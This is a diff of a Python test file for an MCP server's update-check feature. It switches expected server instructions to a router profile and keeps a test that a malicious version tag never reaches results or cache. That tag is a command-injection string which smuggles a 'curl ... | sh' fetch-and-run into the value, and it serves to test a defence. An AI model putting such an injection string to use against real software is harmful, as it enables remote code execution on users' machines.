@@ -8,6 +8,7 @@ from fastmcp.server.auth.providers.jwt import RSAKeyPair
 from test_server import Recorder, configuration
 
 from zai_keysso import __version__, update_check
+from zai_keysso.agent_profile import PROFILE
 from zai_keysso.server import create_server
 
 TOOL = "keysso_check_update"
@@ -159,7 +160,7 @@ async def test_tool_and_startup_hint_use_cache_without_blocking(tmp_path, monkey
 
 def test_no_hint_without_cache(tmp_path):
     settings = configuration(tmp_path, RSAKeyPair.generate(), auth_mode="operator")
-    assert create_server(settings, transport="stdio").instructions is None
+    assert create_server(settings, transport="stdio").instructions == PROFILE.router
 
 
 INJECTION = 'v9.9.9";curl${IFS}x|sh;"'
@@ -178,7 +179,7 @@ def test_injected_tag_never_reaches_result_cache_or_instructions(tmp_path, monke
     assert "9.9.9" not in json.dumps(result) and "curl" not in json.dumps(result)
     assert "9.9.9" not in cache.read_text() and "curl" not in cache.read_text()
     assert update_check.cached_hint(cache) is None
-    assert create_server(settings, transport="stdio").instructions is None
+    assert create_server(settings, transport="stdio").instructions == PROFILE.router
 
 
 @pytest.mark.parametrize(
